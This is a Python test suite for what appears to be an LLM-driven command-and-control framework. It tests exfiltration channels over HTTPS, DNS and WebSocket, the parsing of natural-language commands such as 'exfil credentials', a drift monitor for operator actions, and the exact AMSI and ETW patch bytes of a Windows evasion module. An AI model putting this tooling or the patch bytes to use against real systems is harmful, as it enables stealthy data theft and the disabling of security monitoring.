"""
zer0DAYSlater core test suite.
Tests parse logic, config loading, and channel interface contracts.
"""
import os
import sys

# Ensure project root is on path
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))


# ── Config ────────────────────────────────────────────────────────────────────

def test_config_loads():
    from config import CONFIG
    assert isinstance(CONFIG, dict)
    for key in ("mqtt_broker", "mqtt_port", "https_endpoint", "auth_token",
                 "c2_ws_url", "plugin_server"):
        assert key in CONFIG, f"Missing key in CONFIG: {key}"


def test_config_no_hardcoded_secrets():
    from config import CONFIG
    assert CONFIG["auth_token"] != "test-token", \
        "Hardcoded test-token still present in config"
    assert "yourserver" not in CONFIG.get("c2_ws_url", ""), \
        "Placeholder URL still present in c2_ws_url"
    assert "yourserver" not in CONFIG.get("plugin_server", ""), \
        "Placeholder URL still present in plugin_server"


# ── LLM command parser ────────────────────────────────────────────────────────

def test_parse_exfil_command():
    from llm_command_parser import parse_natural_command
    result = parse_natural_command("exfil user profiles after midnight")
    assert result["action"] == "exfil"
    assert result["filters"].get("target") == "user_profiles"
    assert result["schedule"] is not None


def test_parse_scheduled_time():
    from llm_command_parser import parse_natural_command
    result = parse_natural_command("exfil credentials after 3pm")
    assert result["schedule"] is not None
    assert result["action"] == "exfil"


def test_parse_unknown_command_returns_none_action():
    from llm_command_parser import parse_natural_command
    result = parse_natural_command("do something vague")
    assert result["action"] is None


def test_parse_returns_required_keys():
    from llm_command_parser import parse_natural_command
    result = parse_natural_command("")
    assert "action" in result
    assert "filters" in result
    assert "schedule" in result


# ── Channel interface contracts ───────────────────────────────────────────────

def test_exfil_https_interface():
    """send_via_https and get_task_https must accept agent_id as first arg."""
    import inspect
    from core.exfil_https import send_via_https, get_task_https
    sig_send = inspect.signature(send_via_https)
    sig_get = inspect.signature(get_task_https)
    assert "agent_id" in sig_send.parameters
    assert "agent_id" in sig_get.parameters


def test_exfil_dns_interface():
    import inspect
    from core.exfil_dns import send_via_dns, get_task_dns
    sig_send = inspect.signature(send_via_dns)
    sig_get = inspect.signature(get_task_dns)
    assert "agent_id" in sig_send.parameters
    assert "agent_id" in sig_get.parameters


def test_exfil_ws_interface():
    import inspect
    from core.exfil_ws import send_via_ws, get_task_ws
    sig_send = inspect.signature(send_via_ws)
    sig_get = inspect.signature(get_task_ws)
    assert "agent_id" in sig_send.parameters
    assert "agent_id" in sig_get.parameters


def test_channel_send_returns_bool_when_unconfigured():
    """All send functions must return False (not raise) when env not set."""
    from core.exfil_https import send_via_https
    from core.exfil_dns import send_via_dns
    from core.exfil_ws import send_via_ws
    assert send_via_https("test-agent", {}) is False
    assert send_via_dns("test-agent", {}) is False
    assert send_via_ws("test-agent", {}) is False


def test_channel_get_returns_none_when_unconfigured():
    """All get functions must return None (not raise) when env not set."""
    from core.exfil_https import get_task_https
    from core.exfil_dns import get_task_dns
    from core.exfil_ws import get_task_ws
    assert get_task_https("test-agent") is None
    assert get_task_dns("test-agent") is None
    assert get_task_ws("test-agent") is None


# ── Evasion patch bytes ───────────────────────────────────────────────────────

def test_amsi_patch_bytes_correct():
    """Verify AMSI patch is xor eax,eax; ret — not corrupted escape sequences."""
    import ast
    import pathlib
    src = pathlib.Path("evasion_win.py").read_text()
    # Find the AMSI patch line
    for line in src.splitlines():
        if "patch" in line and "xor eax" in line:
            # Extract the bytes literal
            val = line.split("=")[1].strip().split("#")[0].strip()
            b = ast.literal_eval(val)
            assert b == b"\x31\xc0\xc3", f"AMSI patch bytes wrong: {b.hex()}"
            return
    raise AssertionError("AMSI patch line not found in evasion_win.py")


def test_etw_patch_bytes_correct():
    """Verify ETW patch is xor rax,rax; ret."""
    import ast
    import pathlib
    src = pathlib.Path("evasion_win.py").read_text()
    for line in src.splitlines():
        if "patch" in line and "xor rax" in line:
            val = line.split("=")[1].strip().split("#")[0].strip()
            b = ast.literal_eval(val)
            assert b == b"\x48\x33\xc0\xc3", f"ETW patch bytes wrong: {b.hex()}"
            return
    raise AssertionError("ETW patch line not found in evasion_win.py")


# ── LLM Operator (structure only — no live Ollama required) ───────────────────

def test_llm_operator_imports():
    from llm_operator import parse_operator_command, _resolve_time_expression
    assert callable(parse_operator_command)
    assert callable(_resolve_time_expression)


def test_resolve_midnight():
    from llm_operator import _resolve_time_expression
    result = _resolve_time_expression("exfil after midnight")
    assert result is not None
    import datetime
    dt = datetime.datetime.fromisoformat(result)
    assert dt.hour == 0
    assert dt.minute == 1


def test_resolve_relative_time_minutes():
    from llm_operator import _resolve_time_expression
    result = _resolve_time_expression("run in 30 minutes")
    assert result is not None


def test_resolve_pm_time():
    from llm_operator import _resolve_time_expression
    result = _resolve_time_expression("execute after 3pm")
    assert result is not None
    import datetime
    dt = datetime.datetime.fromisoformat(result)
    assert dt.hour == 15


def test_resolve_no_time_returns_none():
    from llm_operator import _resolve_time_expression
    result = _resolve_time_expression("exfil user profiles quietly")
    assert result is None


def test_null_result_structure():
    from llm_operator import _null_result
    result = _null_result("test command", "test error")
    for key in ("action", "targets", "schedule", "priority", "noise", "_error"):
        assert key in result
    assert result["action"] is None
    assert result["_error"] == "test error"


# ── Session Drift Monitor ─────────────────────────────────────────────────────

def test_drift_monitor_imports():
    from session_drift_monitor import SessionDriftMonitor, DriftType
    assert SessionDriftMonitor is not None


def test_baseline_established_on_first_ingest():
    from session_drift_monitor import SessionDriftMonitor
    monitor = SessionDriftMonitor()
    action = {
        "action": "exfil", "targets": ["user_profiles"],
        "schedule": None, "priority": "normal",
        "noise": "silent", "rationale": "test", "_error": None,
    }
    status = monitor.ingest(action)
    assert monitor.baseline is not None
    assert monitor.baseline.action == "exfil"
    assert status["drift_score"] < 0.10  # first action may have minor structural signals


def test_nominal_action_low_drift():
    from session_drift_monitor import SessionDriftMonitor
    monitor = SessionDriftMonitor()
    base = {
        "action": "exfil", "targets": ["credentials"],
        "schedule": None, "priority": "normal",
        "noise": "silent", "rationale": "base", "_error": None,
    }
    monitor.ingest(base)
    same = dict(base)
    status = monitor.ingest(same)
    assert status["drift_score"] < 0.40
    assert not status["halt"]


def test_semantic_drift_detected():
    from session_drift_monitor import SessionDriftMonitor, DriftType
    monitor = SessionDriftMonitor()
    monitor.ingest({
        "action": "exfil", "targets": ["credentials"],
        "schedule": None, "priority": "normal",
        "noise": "silent", "rationale": "base", "_error": None,
    })
    status = monitor.ingest({
        "action": "persist", "targets": ["credentials"],
        "schedule": None, "priority": "normal",
        "noise": "silent", "rationale": "drift", "_error": None,
    })
    types = [s["type"] for s in status["signals"]]
    assert DriftType.SEMANTIC_DRIFT.value in types


def test_noise_violation_detected():
    from session_drift_monitor import SessionDriftMonitor, DriftType
    monitor = SessionDriftMonitor()
    monitor.ingest({
        "action": "exfil", "targets": ["credentials"],
        "schedule": None, "priority": "normal",
        "noise": "silent", "rationale": "base", "_error": None,
    })
    status = monitor.ingest({
        "action": "exfil", "targets": ["credentials"],
        "schedule": None, "priority": "normal",
        "noise": "aggressive", "rationale": "loud", "_error": None,
    })
    types = [s["type"] for s in status["signals"]]
    assert DriftType.NOISE_VIOLATION.value in types


def test_scope_creep_detected():
    from session_drift_monitor import SessionDriftMonitor, DriftType
    monitor = SessionDriftMonitor()
    monitor.ingest({
        "action": "exfil", "targets": ["user_profiles"],
        "schedule": None, "priority": "normal",
        "noise": "silent", "rationale": "base", "_error": None,
    })
    status = monitor.ingest({
        "action": "exfil",
        "targets": ["user_profiles", "credentials", "ssh_keys", "documents"],
        "schedule": None, "priority": "normal",
        "noise": "silent", "rationale": "expanded", "_error": None,
    })
    types = [s["type"] for s in status["signals"]]
    assert DriftType.SCOPE_CREEP.value in types


def test_parse_failure_signals_high_severity():
    from session_drift_monitor import SessionDriftMonitor, DriftType
    monitor = SessionDriftMonitor()
    monitor.ingest({
        "action": "exfil", "targets": [],
        "schedule": None, "priority": "normal",
        "noise": "normal", "rationale": "base", "_error": None,
    })
    status = monitor.ingest({
        "action": None, "targets": [],
        "schedule": None, "priority": "normal",
        "noise": "normal", "rationale": "",
        "_error": "JSON parse failed: ...",
    })
    types = [s["type"] for s in status["signals"]]
    assert DriftType.PARSE_FAILURE.value in types
    parse_sig = next(s for s in status["signals"]
                     if s["type"] == DriftType.PARSE_FAILURE.value)
    assert parse_sig["severity"] >= 0.7


def test_drift_score_caps_at_1():
    from session_drift_monitor import SessionDriftMonitor
    monitor = SessionDriftMonitor()
    monitor.ingest({
        "action": "exfil", "targets": ["credentials"],
        "schedule": None, "priority": "normal",
        "noise": "silent", "rationale": "base", "_error": None,
    })
    for _ in range(10):
        monitor.ingest({
            "action": "persist",
            "targets": ["everything", "credentials", "ssh_keys", "documents",
                        "domain_controller", "network"],
            "schedule": None, "priority": "high",
            "noise": "aggressive", "rationale": "",
            "_error": "JSON parse failed",
        })
    assert monitor.drift_score <= 1.0


def test_monitor_reset_clears_state():
    from session_drift_monitor import SessionDriftMonitor
    monitor = SessionDriftMonitor()
    monitor.ingest({
        "action": "exfil", "targets": ["credentials"],
        "schedule": None, "priority": "normal",
        "noise": "normal", "rationale": "base", "_error": None,
    })
    monitor.reset()
    assert monitor.baseline is None
    assert monitor.drift_score == 0.0
    assert monitor.action_count == 0


def test_report_structure():
    from session_drift_monitor import SessionDriftMonitor
    monitor = SessionDriftMonitor()
    monitor.ingest({
        "action": "exfil", "targets": ["credentials"],
        "schedule": None, "priority": "normal",
        "noise": "normal", "rationale": "base", "_error": None,
    })
    report = monitor.report()
    for key in ("session_actions", "drift_score", "status",
                "total_signals", "signal_breakdown", "baseline"):
        assert key in report
    assert report["status"] in ("NOMINAL", "WARN", "HALT")
